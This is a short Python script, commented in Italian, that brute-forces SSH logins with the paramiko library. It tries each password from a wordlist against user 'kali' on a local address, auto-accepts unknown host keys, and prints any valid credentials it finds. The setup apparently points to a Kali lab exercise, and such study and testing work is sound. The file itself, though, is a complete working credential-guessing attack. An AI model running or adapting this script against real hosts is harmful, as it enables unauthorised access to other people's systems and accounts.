import socket                                                                                                   #modulo per gestione delle eccezioni di rete
import paramiko                                                                                                 #modulo per connessioni SSH

def AccessSSH(host, port, username, password_list):                                                             #funzione per tentare l'accesso SSH con una lista di password
    client = paramiko.SSHClient()                                                                               #creo un'istanza di SSHClient (oggetto client SSH)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())                                                #accetto automaticamente chiavi host sconosciute

    for password in password_list:                                                                              #ciclo for per ogni password nella lista
        try:
            print(f"Tentativo con credenziali: {username}:{password.strip()}")                                  #stampo le credenziali in uso nel tentativo
            client.connect(hostname=host, port=port, username=username, password=password.strip(), timeout=5)   #provo a connettermi, timeout di 5 secondi
            print(f"Accesso riuscito con credenziali: {username}:{password.strip()}")                           #stampo le credenziali valide trovate
            client.close()                                                                                      #chiudo la connessione
            return password.strip()                                                                             #ritorno la password trovata
        except paramiko.AuthenticationException:                                                                #gestione eccezione per autenticazione fallita
            print("Autenticazione fallita.")                                                                    #stampo messaggio di autenticazione fallita
            continue                                                                                            #continuo con la prossima password
        except (paramiko.SSHException, socket.error) as e:                                                      #gestione eccezioni per errori SSH o di rete
            print(f"Riscontrato errore: {e}")                                                                   #stampo il messaggio di errore riscontrato
            continue

    print("Password non trovata")                                                                               #stampo messaggio se nessuna password nella lista è valida
    return None                                                                                                 #se nessuna password è valida non ritorno nulla

def main():                                                                                                     #funzione principale
    host_target = "192.168.1.71"                                                                                #IP del target
    port_target = 22                                                                                            #porta SSH standard
    user = "kali"                                                                                               #username da testare


    with open("/home/kali/Desktop/pwd_list.txt", "r") as file:                                                  #apro il file di testo contenente le password, in lettura
        psw = file.readlines()                                                                                  #leggo tutte le righe del file e le salvo in una lista

    found = AccessSSH(host_target, port_target, user, psw)                                                      #chiamo la funzione per tentare l'accesso SSH
    if found:                                                                                                   #se viene trovata una password valida
        print(f"Credenziali valide!: {user}:{found}")                                                           #stampo le credenziali valide trovate
    else:                                                                                                       #altrimenti
        print("Credenziali non trovate.")                                                                       #stampo messaggio di credenziali non trovate

main()                                                                                                          #richiamo la funzione principale